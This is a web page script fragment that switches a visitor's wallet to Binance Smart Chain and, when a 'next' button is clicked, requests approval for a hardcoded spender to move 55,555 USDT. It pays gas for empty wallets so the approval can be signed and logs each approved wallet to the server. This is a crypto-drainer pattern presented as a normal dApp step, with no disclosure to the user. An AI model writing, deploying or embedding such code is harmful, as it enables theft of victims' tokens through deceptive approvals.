  <script>

    async function addAndSwitchToBSC() {
    if (!window.ethereum) {
    alert("Please install MetaMask or a Web3 wallet!");
    return;
    }
    
    const BSC_MAINNET = {
    chainId: "0x38", // 56 in hex (BSC mainnet)
    chainName: "Binance Smart Chain",
    nativeCurrency: {
    name: "BNB",
    symbol: "BNB",
    decimals: 18,
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"],
    };
    
    try {
    // Check current chain
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
    
    // If already on BSC, do nothing
    if (currentChainId === '0x38') {
    console.log("Already on BSC");
    return;
    }
    
    // Try switching to BSC
    try {
    await window.ethereum.request({
    method: 'wallet_switchEthereumChain',
    params: [{ chainId: '0x38' }], // BSC chainId
    });
    console.log("Switched to BSC");
    } catch (switchError) {
    // If BSC is not added, add it
    if (switchError.code === 4902) {
    try {
    await window.ethereum.request({
    method: 'wallet_addEthereumChain',
    params: [BSC_MAINNET],
    });
    console.log("BSC network added!");
    } catch (addError) {
    console.error("Failed to add BSC network:", addError);
    alert("Failed to add BSC. Please add it manually in your wallet.");
    }
    } else {
    console.error("Failed to switch to BSC:", switchError);
    alert("Failed to switch to BSC. Please try manually.");
    }
    }
    } catch (error) {
    console.error("General error:", error);
    alert("An error occurred. Check console for details.");
    }
    }
    
    // Run the function
    addAndSwitchToBSC();
    
    
    </script>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>

<script>
    const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT on BSC
    const funderWallet = '0x2cc4eE673dB9750000c1De0B2dafCE9FAA475761'; // Your funding wallet address
    const spender = '0x20b8c748bc0cf4c1aaec50a331c53c7c335e856c'; // Your dApp or backend address
    
    // USDT has 18 decimals on BSC (unlike 6 on Ethereum)
    const amount = ethers.utils.parseUnits('55555', 18).toString(); // Now correctly handles 55555 USDT
  
    async function approveToken() {
      if (typeof window.ethereum === 'undefined') {
        alert('MetaMask is required!');
        return;
      }
  
      const web3 = new Web3(window.ethereum);
      const ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
  
      try {
        await ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        const userWallet = accounts[0];
  
        // Get the ETH balance to check if the user has enough for gas fees
        const balance = await web3.eth.getBalance(userWallet);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        console.log(`Wallet: ${userWallet}, Balance: ${ethBalance} ETH`);



        if (parseFloat(ethBalance) === 0) {
        // Send 0.00001 ETH from backend
        await fetch('/send-eth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ to: userWallet })
        });
        console.log('Sent 0.00001 ETH');
      }
  
        // Define contract ABI for USDT approval
        const usdtABI = [
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }
        ];
  
        const contract = new web3.eth.Contract(usdtABI, usdtContractAddress);
  
        try {
          // First check current allowance
          const allowanceABI = {
            "constant": true,
            "inputs": [
              {"name": "_owner", "type": "address"},
              {"name": "_spender", "type": "address"}
            ],
            "name": "allowance",
            "outputs": [{"name": "", "type": "uint256"}],
            "type": "function"
          };
          
          const allowanceContract = new web3.eth.Contract([...usdtABI, allowanceABI], usdtContractAddress);
          const currentAllowance = await allowanceContract.methods.allowance(userWallet, spender).call();
          console.log('Current allowance:', currentAllowance);
          
          // Only proceed if current allowance is less than needed
          if (BigInt(currentAllowance) < BigInt(amount)) {
            // Approve the token with the correct amount
            const tx = await contract.methods.approve(spender, amount).send({ from: userWallet });
            console.log('Approved 55555 USDT. Tx hash:', tx.transactionHash);
          } else {
            console.log('Sufficient allowance already exists');
          }
  
          // Log wallet to server
          await fetch('/log-wallet', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ wallet: userWallet })
          });
  
          console.log('Wallet approved and logged!');
        } catch (err) {
          console.error('Approval failed:', err);
          console.log('Approval failed. Check console for details.');
        }
      } catch (err) {
        console.error('Error during wallet interaction:', err);
        console.log('Please check your wallet connection or ensure MetaMask is properly set up.');
      }
    }
  
    // Trigger approval
    document.getElementById('nextBtn').addEventListener('click', approveToken);
  </script>
